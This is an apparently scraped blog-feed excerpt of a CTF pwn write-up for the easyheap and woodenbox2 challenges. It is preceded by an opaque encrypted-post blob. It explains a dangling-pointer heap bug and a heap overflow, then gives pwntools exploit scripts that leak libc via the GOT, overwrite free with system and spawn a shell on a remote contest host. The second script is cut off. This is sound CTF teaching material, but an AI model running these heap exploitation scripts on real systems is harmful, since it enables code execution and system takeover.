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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        